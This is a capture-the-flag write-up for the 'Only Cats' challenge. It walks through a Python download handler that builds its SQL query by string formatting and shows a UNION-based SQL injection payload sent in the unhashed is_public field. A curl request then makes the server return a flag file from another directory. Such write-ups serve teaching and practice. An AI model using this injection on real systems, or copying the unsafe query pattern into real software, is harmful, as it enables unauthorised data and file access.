---
created: 2024-06-11T01:33
updated: 2024-06-11T01:35
---

> APOCALYPSE has recently started a new business venture, a website for people to download cute images of cats! While
> that seems like a relatively normal kind of business, our intel says that it might be more than what it appears to be.
> So we've got to keep a close eye on it. Currently, their service has only cat pictures.
>
> However rumors are going around that they're venturing into dogs very soon. Could u confirm the rumour for me?

Ignoring much of the code, we can find the important stuff here

```python
assert os.path.exists("/app/images/dogs/flag.jpg")


async def download(request: Request):
    form = {**(await request.form())}
    query = {"is_public": "yes"}
    if form.get("species") is None: return "Fail"
    form["species"] = hashlib.md5(form["species"].encode()).hexdigest()
    query.update(form)
    result = await database.fetch_one(
        query="SELECT filename FROM cats WHERE is_public='{is_public}' AND species='{species}'".format(**query)
    )
    if not result or ".." in result["filename"]: return "Fail"
    return FileResponse(os.path.join("/app", "images", "cats", result["filename"]))
```

We have to send the flag from `/app/images/dogs/flag.jpg`, so the SQL query just have to return that value.

```sql
SELECT filename
FROM cats
WHERE is_public = '{is_public}'
  AND species = '{species}'
```

With some simple SQL injection

```python
species="tabby"
is_public="true' AND 1=2 UNION SELECT '/app/images/dogs/flag.jpg' --"
```

It becomes

```sql
SELECT filename
FROM cats
WHERE is_public = 'true'
  AND 1 = 2
UNION
SELECT '/app/images/dogs/flag.jpg' --' AND species='[some hash]'
```

Thus we form the request

```bash
## Only Cats
curl -X "POST" "http://chals.cyberthon22f.ctf.sg:40501/download/" \
     -H 'Content-Type: application/x-www-form-urlencoded; charset=utf-8' \
     --data-urlencode "species=tabby" \
     --data-urlencode "is_public=true' AND 1=2 UNION SELECT '/app/images/dogs/flag.jpg' --"
```

![img.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1718084106/2024/06/82e66c049de002219a3ee9a267cfa0a6.png)

And heres our flag

```flag
Cyberthon{why_15_1t_4Lw4y5_d0g}
```
